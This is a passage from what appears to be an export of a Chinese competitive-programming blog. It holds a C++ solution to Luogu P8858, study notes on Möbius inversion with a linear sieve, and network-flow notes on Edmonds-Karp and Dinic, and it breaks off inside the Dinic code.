  f[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= cnt; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= n; j++) f[i][j] = f[i - <span class="number">1</span>][j];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = primes[i]; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> tmp = primes[i];</span><br><span class="line">            <span class="keyword">while</span> (tmp &lt;= j) &#123;</span><br><span class="line">                f[i][j] = (f[i][j] + f[i - <span class="number">1</span>][j - tmp] * tmp % m) % m;</span><br><span class="line">                tmp *= primes[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) ans = (ans + f[cnt][i]) % m;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>洛谷</tag>
        <tag>USACO</tag>
        <tag>2020</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P8858」折线 - 贪心 + 树状数组 + 二分</title>
    <url>/luogu-8858/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p>平面直角坐标系的第一象限内有一块左下角为 <span
class="math inline">\((0,0)\)</span> 右上角为 <span
class="math inline">\((10^{100},10^{100})\)</span>
的矩形区域，区域内有<strong>正偶数</strong>个整点，试求出这样一条从
<span class="math inline">\((0,0)\)</span> 出发，到 <span
class="math inline">\((10^{100},10^{100})\)</span>
的在区域内部的折线：</p>
<ul>
<li>折线的每一部分都平行于 <span class="math inline">\(x\)</span> 轴或
<span class="math inline">\(y\)</span> 轴。</li>
<li>折线不能经过给定的整点。</li>
<li>折线将整块区域分成包含给定整点个数相等的两块。</li>
<li>折线拥有尽可能少的折点。</li>
</ul>
<p>可以证明一定存在一条满足限制的折线，你只需要输出满足限制的折线的折点数即可。</p>
<p>注意折点的坐标可以不是整数。</p>
<p>每组测试点有 <span class="math inline">\(T\)</span>
组数据，对于所有测试点，<span class="math inline">\(1 \leq T \leq
10^4\)</span>，<span class="math inline">\(1 \leq \sum n \leq 5 \times
10^5\)</span>，<span class="math inline">\(1 \leq n \leq
10^5\)</span>，<span class="math inline">\(1 \leq x_i,y_i \leq
n\)</span>，保证 <span class="math inline">\(n\)</span>
为正偶数，每组数据中不存在两个坐标相同的整点。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>首先我们可以证明出一条定理：答案必定大于等于 <span
class="math inline">\(2\)</span> 且小于等于 <span
class="math inline">\(4\)</span>。首先由于点都在 <span
class="math inline">\((1 \sim 100, 1 \sim 100)\)</span> 之间，于是为了在
<span class="math inline">\((1 \sim 100, 1 \sim 100)\)</span>
之间平分点，我们至少要在这里转折一次。而在这区间之外无论如何均只需转向一次就可平分面积。于是答案必定大于等于
<span class="math inline">\(2\)</span>。又显然我们可以通过至多 <span
class="math inline">\(3\)</span> 次转折分隔点，加上分隔面积总共 <span
class="math inline">\(4\)</span> 次，于是答案小于等于 <span
class="math inline">\(4\)</span>。</p>
<p>于是我们可以分类讨论情况答案是否为 <span
class="math inline">\(2\)</span>、<span
class="math inline">\(3\)</span>、<span class="math inline">\(4\)</span>
即可。目前我们从横行考虑。纵行翻转一下坐标同理。</p>
<p>答案为 <span class="math inline">\(2\)</span>
时很好判断，显然我们只需要判断横行上下点的数目是否相等即可。可用树状数组解决。</p>
<p>答案为 <span class="math inline">\(3\)</span>
时，我们可推出情况为选定一个横行 <span class="math inline">\(x\)</span>
与纵行 <span class="math inline">\(y\)</span>，满足 <span
class="math inline">\(a \le x\)</span> 且 <span class="math inline">\(y
\le b\)</span> 的点 <span class="math inline">\((a, b)\)</span> 的个数为
<span
class="math inline">\(\frac{n}{2}\)</span>。于是我们可将每个点按照先
<span class="math inline">\(x\)</span> 后 <span
class="math inline">\(y\)</span>
的优先级从小到大排序，然后对于每一行二分求出是否可找出满足条件的 <span
class="math inline">\(y\)</span> 即可。</p>
<p>其余情况答案即为 <span
class="math inline">\(4\)</span>，单次询问时间复杂度为 <span
class="math inline">\(O(n \log^2 n)\)</span>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BinaryIndexedTree</span> &#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; a;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">        a.<span class="built_in">resize</span>(n + <span class="number">1</span>);</span><br><span class="line">        std::<span class="built_in">fill</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x &amp; -x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> pos, <span class="type">int</span> delta)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (; pos &lt;= n; pos += <span class="built_in">lowbit</span>(pos)) a[pos] += delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> pos)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (; pos; pos -= <span class="built_in">lowbit</span>(pos)) res += a[pos];</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; bit;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    std::vector&lt;std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; a[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) a[i].<span class="built_in">resize</span>(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;a[<span class="number">0</span>][i].first, &amp;a[<span class="number">0</span>][i].second);</span><br><span class="line">        a[<span class="number">1</span>][i] = std::<span class="built_in">make_pair</span>(a[<span class="number">0</span>][i].second, a[<span class="number">0</span>][i].first);</span><br><span class="line">    &#125;</span><br><span class="line">    std::<span class="built_in">sort</span>(a[<span class="number">0</span>].<span class="built_in">begin</span>(), a[<span class="number">0</span>].<span class="built_in">end</span>());</span><br><span class="line">    std::<span class="built_in">sort</span>(a[<span class="number">1</span>].<span class="built_in">begin</span>(), a[<span class="number">1</span>].<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">        bit.<span class="built_in">init</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) bit.<span class="built_in">update</span>(a[i][j].first, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bit.<span class="built_in">query</span>(j) == n / <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bit.<span class="built_in">query</span>(j) &gt; n / <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">        bit.<span class="built_in">init</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            bit.<span class="built_in">update</span>(a[i][j].second, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (j == n - <span class="number">1</span> || a[i][j + <span class="number">1</span>].first != a[i][j].first) &#123;</span><br><span class="line">                <span class="type">int</span> l = <span class="number">0</span>, r = n;</span><br><span class="line">                <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">                    <span class="type">int</span> mid = l + (r - l + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">if</span> (bit.<span class="built_in">query</span>(mid) &lt;= j + <span class="number">1</span> - n / <span class="number">2</span>) l = mid;</span><br><span class="line">                    <span class="keyword">else</span> r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (bit.<span class="built_in">query</span>(l) == j + <span class="number">1</span> - n / <span class="number">2</span>) &#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (t--) <span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>数据结构</tag>
        <tag>树状数组</tag>
        <tag>贪心</tag>
        <tag>二分</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>莫比乌斯反演学习笔记</title>
    <url>/mobius-notes/</url>
    <content><![CDATA[<h1 id="莫比乌斯函数">莫比乌斯函数</h1>
<p>了解莫比乌斯反演前，我们先要了解莫比乌斯函数。记 <span
class="math inline">\(\mu(n)\)</span> 为莫比乌斯函数，<span
class="math inline">\(n\)</span> 可被分解质因数为 <span
class="math inline">\(n = \prod_{i = 1}^{m}{ {p_i}^{c_i} }\)</span>
定义如下：</p>
<p><span class="math display">\[
\mu(n) = \begin{cases}
1 &amp; n = 1 \\
0 &amp; \exists i \in [1, m], c_i &gt; 1 \\
(-1)^m &amp; \forall i \in [1, m], c_i = 1 \\
\end{cases}
\]</span></p>
<p>形式化地解释一下：</p>
<ul>
<li>当 <span class="math inline">\(n = 1\)</span> 时，<span
class="math inline">\(\mu(n) = 1\)</span>；</li>
<li>当 <span class="math inline">\(n\)</span>
存在至少一个出现次数大于等于两次的质因子时，<span
class="math inline">\(\mu(n) = 0\)</span>；</li>
<li>当 <span class="math inline">\(n\)</span>
的所有质因子仅出现过一次，且 <span class="math inline">\(n\)</span>
有奇数个质因子时，<span class="math inline">\(\mu(n) =
-1\)</span>；</li>
<li>当 <span class="math inline">\(n\)</span>
的所有质因子仅出现过一次，且 <span class="math inline">\(n\)</span>
有偶数个质因子时，<span class="math inline">\(\mu(n) = 1\)</span>。</li>
</ul>
<span id="more"></span>
<h1 id="莫比乌斯函数的性质">莫比乌斯函数的性质</h1>
<h2 id="积性函数">积性函数</h2>
<p>首先易得 <span class="math inline">\(\mu(i)\)</span>
为积性函数，即对于 <span class="math inline">\(\forall a, b \in
\mathbb{N}^*\)</span>，且 <span class="math inline">\(\gcd(a, b) =
1\)</span>，均满足 <span class="math inline">\(\mu(ab) = \mu(a)
\mu(b)\)</span>。于是 <span class="math inline">\(\mu(n)\)</span>
满足积性函数性质：</p>
<ul>
<li>令 <span class="math inline">\(n\)</span> 分解质因数为 <span
class="math inline">\(n = \prod_{i = 1}^{m}{ {p_i}^{c_i}
}\)</span>，则有 <span class="math inline">\(\mu(n) = \prod_{i =
1}^{m}{\mu({p_i}^{c_i})}\)</span></li>
</ul>
<p>证明显然。</p>
<h3 id="筛法">筛法</h3>
<p>由于是积性函数，我们可以用线性筛求莫比乌斯函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> isNotPrime[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> mu[MAXN + <span class="number">1</span>], primes[MAXN + <span class="number">1</span>], cnt;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">getPrimes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    isNotPrime[<span class="number">0</span>] = isNotPrime[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">    mu[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= MAXN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isNotPrime[i]) &#123;</span><br><span class="line">            primes[++cnt] = i;</span><br><span class="line">            mu[i] = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= cnt; j++) &#123;</span><br><span class="line">            <span class="type">int</span> t = i * primes[j];</span><br><span class="line">            <span class="keyword">if</span> (t &gt; MAXN) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            isNotPrime[t] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i % primes[j] == <span class="number">0</span>) &#123;</span><br><span class="line">                mu[t] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> mu[t] = -mu[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="特殊性质">特殊性质</h2>
<p>莫比乌斯函数还有以下性质：</p>
<p><span class="math display">\[
\sum_{d | n}{\mu(d)} = [n = 1]
\]</span></p>
<p>其中 <span class="math inline">\([n = 1]\)</span> 表示：当 <span
class="math inline">\(n = 1\)</span> 时，该值为 <span
class="math inline">\(1\)</span>；否则该值为 <span
class="math inline">\(0\)</span>。</p>
<p>证明：</p>
<ul>
<li>当 <span class="math inline">\(n = 1\)</span> 时，显然成立；</li>
<li>当 <span class="math inline">\(n \ne 1\)</span> 时：首先我们将 <span
class="math inline">\(n\)</span> 分解质因数为 <span
class="math inline">\(n = \prod_{i = 1}^{m}{ {p_i}^{c_i} } \quad m &gt;
1\)</span>，设 <span class="math inline">\(n&#39; = \prod_{i =
1}^{m}{p_i}\)</span>，显然有 <span class="math inline">\(\sum_{d |
n}{\mu(d)} = \sum_{d | n&#39;}{\mu(d)}\)</span>，通过组合数学可得：<span
class="math inline">\(\sum_{d | n&#39;}{\mu(d)} = \sum_{i = 0}^m{ {m
\choose i} (-1)^m }\)</span>。由二项式定理可得：<span
class="math inline">\((1 + (-1))^m = \sum_{i = 0}^{m}{ {m \choose i}
(-1)^m }\)</span>，故我们可得 <span class="math inline">\(\sum_{d | n}{
\mu(d) } = 0^m = 0\)</span>。</li>
</ul>
<h1 id="莫比乌斯反演">莫比乌斯反演</h1>
<p>接下来就是莫比乌斯反演了。莫比乌斯反演定义如下：</p>
<p>设 <span class="math inline">\(f(n)\)</span>，<span
class="math inline">\(F(n)\)</span>
为数论函数（即定义域为正整数的函数），则满足下列关系：</p>
<p><span class="math display">\[
F(n) = \sum_{d | n}{f(d)} \Rightarrow
f(n) = \sum_{d | n}{\mu(d)F(\frac{n}{d})}
\]</span></p>
<p>莫比乌斯反演还有下列另一种形式：</p>
<p><span class="math display">\[
F(n) = \sum_{n | d}{f(d)} \Rightarrow
f(n) = \sum_{n | d}{\mu(\frac{d}{n})F(d)}
\]</span></p>
<h2 id="证明">证明</h2>
<h3 id="狄利克雷卷积">狄利克雷卷积</h3>
<p>在证明之前，我们需要先了解狄利克雷卷积。</p>
<p>对于两个数论函数 <span class="math inline">\(f(n)\)</span> 与 <span
class="math inline">\(g(n)\)</span>，定义两函数的狄利克雷卷积（其中
<span class="math inline">\((n)\)</span> 可省略不写）：</p>
<p><span class="math display">\[
(f * g)(n) = \sum_{d | n}{f(d)g(\frac{n}{d})}
\]</span></p>
<p>显然该运算满足以下运算律：</p>
<ul>
<li>交换律：<span class="math inline">\(f * g = g * f\)</span></li>
<li>结合律：<span class="math inline">\((f * g) * h = f * (g *
h)\)</span></li>
<li>分配律：<span class="math inline">\(f * (g + h) = f * g + f *
h\)</span></li>
</ul>
<p>我们定义 <span class="math inline">\(\varepsilon(n) = [n =
1]\)</span> 为单位函数，显然有以下结论：</p>
<p><span class="math display">\[
f = f * \varepsilon = \varepsilon * f
\]</span></p>
<h3 id="证明步骤">证明步骤</h3>
<p>接下来就可以证明了。利用卷积定义可推出：</p>
<p><span class="math display">\[
\sum_{d | n}{\mu(d)} = [n = 1] \Rightarrow \mu * 1 = \varepsilon
\]</span></p>
<p><span class="math display">\[
F(n) = \sum_{d | n}{f(d)} \Rightarrow F = f * 1
\]</span></p>
<p>故我们可以推出：</p>
<p><span class="math display">\[
\begin{align*}
F * \mu &amp;= f * 1 * \mu \\
\Rightarrow F * \mu &amp;= f * (\mu * 1) \\
\Rightarrow F * \mu &amp;= f * \varepsilon \\
\Rightarrow F * \mu &amp;= f
\end{align*}
\]</span></p>
<p>将最后的等式展开即可得：</p>
<p><span class="math display">\[
f(n) = \sum_{d | n}{\mu(d)F(\frac{n}{d})}
\]</span></p>
]]></content>
      <categories>
        <category>OI</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>学习笔记</tag>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>线性筛</tag>
        <tag>莫比乌斯反演</tag>
      </tags>
  </entry>
  <entry>
    <title>网络流学习笔记</title>
    <url>/network-flow-notes/</url>
    <content><![CDATA[<p>网络流是一个图论中很大的知识点，这里只涉及部分内容。本篇只涉及最大流、最小割和费用流的相关知识。</p>
<h1 id="概念">概念</h1>
<p>一张有向图 <span class="math inline">\(G = (V,
E)\)</span>，对于每条边 <span class="math inline">\((u， v) \in
E\)</span> 都有一个权值 <span class="math inline">\(c(u, v) &gt;
0\)</span>，称为边的 <strong>容量</strong>。且对于图上没有的边 <span
class="math inline">\((u， v) \notin E\)</span>，<span
class="math inline">\(c(u, v) = 0\)</span>，则这张图叫做一个
<strong>网络</strong>，图中有两个特殊的点 <span class="math inline">\(s
\in V\)</span> 和 <span class="math inline">\(t \in
V\)</span>，这两个点称为 <strong>源点</strong> 和
<strong>汇点</strong>。</p>
<span id="more"></span>
<p>我们设 <span class="math inline">\(f(u, v)\)</span>
是一个两个自变量均为节点（<span class="math inline">\(u \in V, v \in
V\)</span>）的函数，且满足下列性质：</p>
<ul>
<li><span class="math inline">\(f(u, v) \le c(u,
v)\)</span>（容量限制）</li>
<li><span class="math inline">\(f(u, v) = -f(v,
u)\)</span>（斜对称）</li>
<li><span class="math inline">\(\forall u \in \complement_V\{s, t\},
\sum_{(u, x) \in E}{f(u, x)} = \sum_{(x, v) \in E}{f(x,
v)}\)</span>（流量守恒）</li>
</ul>
<p>则我们称 <span class="math inline">\(f(u, v)\)</span> 为网络的
<strong>流函数</strong>。对于 <span class="math inline">\((u, v) \in
E\)</span>，<span class="math inline">\(f(u, v)\)</span> 称为这条边的
<strong>流量</strong>。<span class="math inline">\(c(u, v) - f(u,
v)\)</span> 称为这条边的 <strong>剩余流量</strong>。<span
class="math inline">\(\sum_{(s, u) \in E}{f(s, u)}\)</span>
则被称为整个网络的流量。</p>
<p>像下图就是一张网络。在边上标记的数字为 <span
class="math inline">\(f(u, v) / c(u, v)\)</span>。</p>
<img src="/network-flow-notes/network.png" class="">
<p>通过流函数性质我们可以发现：除了源点和汇点外，任何节点都不储存流，且流入总量等于流出总量。于是可以形象化地表述为：在不超过容量限制地前提下，流从源点经过网络流向汇点。</p>
<h1 id="最大流">最大流</h1>
<p>我们把拥有最大流量的网络流称为最大流，即为 <span
class="math inline">\(\sum_{(s, u) \in E}{f(s, u)}\)</span>
最大化。如《概念》上图所示。解决最大流问题最常用 Edmonds-Karp 和 Dinic
两种算法。</p>
<h2 id="edmonds-karp-增广路算法ek-算法">Edmonds-Karp 增广路算法（EK
算法）</h2>
<p>在介绍 EK 算法前，我们需要先了解增广路。</p>
<p>在原图 <span class="math inline">\(G\)</span>
中若一条从源点到汇点的路径上所有边的剩余容量都大于 <span
class="math inline">\(0\)</span>，这条路被称为
<strong>增广路</strong>。</p>
<p>EK 算法则是不停地使用 BFS
算法求出增广路，然后扩大该路的流量，将流量计入答案。直至网络中不存在增广路为止。</p>
<p>方法是每次从源点开始 BFS，寻找 <span class="math inline">\(f(u, v)
&lt; c(u, v)\)</span> 的边，任意找到一条从 <span
class="math inline">\(s\)</span> 到 <span
class="math inline">\(t\)</span> 的路径，同时存储最小剩余容量 <span
class="math inline">\(\text{minF}\)</span>，于是网络流量可增加 <span
class="math inline">\(\text{minF}\)</span>。</p>
<p>同时注意由于斜对称性质，需要给每条边加反流量，即 <span
class="math inline">\(f(v, u) = -f(u,
v)\)</span>。加反边可利用流函数的特性找到更优的增广路，找到多条增广路来抵消不优的增广路，从而得到最优的增广路。形象化地话就看下图（图片引用自
OI Wiki）：</p>
<p><img src="https://oi-wiki.org/graph/flow/images/flow2.png" /></p>
<p>这种算法的最差时间复杂度为 <span
class="math inline">\(O(nm^2)\)</span>。</p>
<p>然而直接求最大流问题，用得最多，且相对高效的算法是 Dinic 算法。</p>
<h2 id="dinic-算法">Dinic 算法</h2>
<p>每次 BFS 只找一条增广路属实浪费，于是衍生出来了 Dinic 算法。</p>
<p>我们需要直到一个概念：在任意时刻，网络中所有节点以及剩余容量大于
<span class="math inline">\(0\)</span> 的边组成的子图叫做
<strong>残量网络</strong>。</p>
<p>Dinic 算法的核心就是通过 BFS 构建出的
<strong>分层图</strong>，然后使用 DFS
在分层图上找增广路，在回溯时实时更新流量，直到找不到增广路为止。最后再使用
BFS 构建分层图，如此往复，直到构建不出分层图即得出答案。</p>
<p>Dinic
可进行当前弧优化。即对于每个点，它的某个出边在增广后就没用了。于是我们在下一次
DFS 的时候就可以直接从下一条边遍历即可。</p>
<p>代码实现如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt; e;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt;::iterator c;</span><br><span class="line">    <span class="type">int</span> l;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    Node *s, *t;</span><br><span class="line">    <span class="type">int</span> c, f, r;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Edge</span>(Node *s, Node *t, <span class="type">int</span> c, <span class="type">int</span> r) : <span class="built_in">s</span>(s), <span class="built_in">t</span>(t), <span class="built_in">c</span>(c), <span class="built_in">f</span>(<span class="number">0</span>), <span class="built_in">r</span>(r) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(Node *s, Node *t, <span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">    s-&gt;e.<span class="built_in">emplace_back</span>(s, t, c, t-&gt;e.<span class="built_in">size</span>());</span><br><span class="line">    t-&gt;e.<span class="built_in">emplace_back</span>(t, s, <span class="number">0</span>, s-&gt;e.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Dinic</span> &#123;</span><br><span class="line">    std::vector&lt;Node&gt; &amp;nodes;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Dinic</span>(std::vector&lt;Node&gt; &amp;nodes) : <span class="built_in">nodes</span>(nodes) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">level</span><span class="params">(Node *s, Node *t, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            nodes[i].c = nodes[i].e.<span class="built_in">begin</span>();</span><br><span class="line">            nodes[i].l = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        std::queue&lt;Node *&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(s);</span><br><span class="line"></span><br><span class="line">        s-&gt;l = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            Node *u = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;[u, v, c, f, r] : u-&gt;e) &#123;</span><br><span class="line">                <span class="keyword">if</span> (f &lt; c &amp;&amp; !v-&gt;l) &#123;</span><br><span class="line">                    v-&gt;l = u-&gt;l + <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">if</span> (v == t) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">else</span> q.<span class="built_in">push</span>(v);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(Node *s, Node *t, <span class="type">int</span> limit = INT_MAX)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s == t) <span class="keyword">return</span> limit;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;e = s-&gt;c; e != s-&gt;e.<span class="built_in">end</span>(); e++) &#123;</span><br><span class="line">            <span class="keyword">auto</span> &amp;[u, v, c, f, r] = *e;</span><br><span class="line">            <span class="keyword">if</span> (f &lt; c &amp;&amp; v-&gt;l == s-&gt;l + <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">int</span> flow = <span class="built_in">find</span>(v, t, std::<span class="built_in">min</span>(limit, c - f));</span><br><span class="line">                <span class="keyword">if</span> (flow) &#123;</span><br><span class="line">                    f += flow;</span><br><span class="line">                    v-&gt;e[r].f -= flow;</span><br><span class="line">                    <span class="keyword">return</span> flow;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> t, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">level</span>(&amp;nodes[s], &amp;nodes[t], n)) &#123;</span><br><span class="line">            <span class="type">int</span> f;</span><br><span class="line">            <span class="keyword">while</span> ((f = <span class="built_in">find</span>(&amp;nodes[s], &amp;nodes[t])) &gt; <span class="number">0</span>) res += f;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span 